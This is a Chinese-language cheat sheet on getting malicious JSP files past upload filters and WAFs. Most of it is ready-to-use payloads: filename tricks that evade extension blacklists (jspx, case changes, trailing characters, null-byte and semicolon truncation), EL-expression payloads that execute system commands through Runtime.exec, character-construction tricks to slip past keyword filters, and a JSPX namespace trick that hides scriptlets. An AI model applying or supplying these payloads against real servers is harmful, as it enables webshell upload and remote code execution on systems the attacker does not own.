# 文件上传漏洞绕过WAF-JSP


## 文件拓展名绕过

- 拓展名没有限制，通过Content-Type字段限制   Content-Type: image/png

- 黑名单->拓展名jspx      `filename="re.jspx"`
- 黑名单->拓展名大小写     `filename="re.JsP"`
- 黑名单->拓展名后加空格   `filename="re.jsp "`
- 黑名单->拓展名后加斜杠   `filename="re.jsp/"`
- 00截断                  `filename="re.jsp%00.jpg"` (需要通过burpsuite hex修改)
- 分号截断                `filename="re.jsp;.jpg"` 

## 文件内容绕过

### 通用方法

- 添加大量的脏数据

### JSP `<% %>`被过滤
>采用EL表达式 `${}`

#### 快速理解
- [EL文档](https://www.tutorialspoint.com/jsp/jsp_expression_language.htm)
- [EL常见写法](https://javaee.github.io/tutorial/jsf-el007.html)
利用常用对象   
```java
pageContext.setAttribute("name1","test"); //保存的数据只在一个页面中有效
request.setAttribute("name2","test"); //保存的数据只在一次请求中有效，请求转发会携带这个数据
session.setAttribute("name3","test"); //保存的数据只在一次会话中有效，从打开浏览器到关闭浏览器
application.setAttribute("name4","test");  //保存的数据只在服务器中有效，从打开服务器到关闭服务器
```
#### poc
命令执行:
```
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami").getInputStream())} 
```
带回显命令执行
```
//获取byte[]对象
${pageContext.setAttribute("byteArrType", heapByteBuffer.array().getClass())}
//构造一个String
${pageContext.setAttribute("stringClass", Class.forName("java.lang.String"))}
${pageContext.setAttribute("stringConstructor", stringClass.getConstructor(byteArrType))}
${pageContext.setAttribute("stringRes", stringConstructor.newInstance(heapByteBuffer.array()))}
//回显结果
${pageContext.getAttribute("stringRes")}
```
#### 表达式常见字符限制绕过

通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤
```
${"xxx".toString().charAt(0).toChars(97)[0].toString()}
${"xxx".toString().charAt(0).toChars(97)[0].toString().concat("xxx".toString().charAt(0).toChars(98)[0].toString())}
```
通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符



### JSPX `jsp:scriptlet`被过滤

将原本的`<jsp:scriptlet>`替换成`<自定义字符:scriptlet>`
```
<hi xmlns:hi="http://java.sun.com/JSP/Page">
    <hi:scriptlet>
        out.println(30*30);
    </hi:scriptlet>
</hi>
```

## Ref
1. [记一次绕过waf的任意文件上传](https://xz.aliyun.com/t/11337)
2. [普通EL表达式命令回显的简单研究](https://forum.butian.net/share/886)
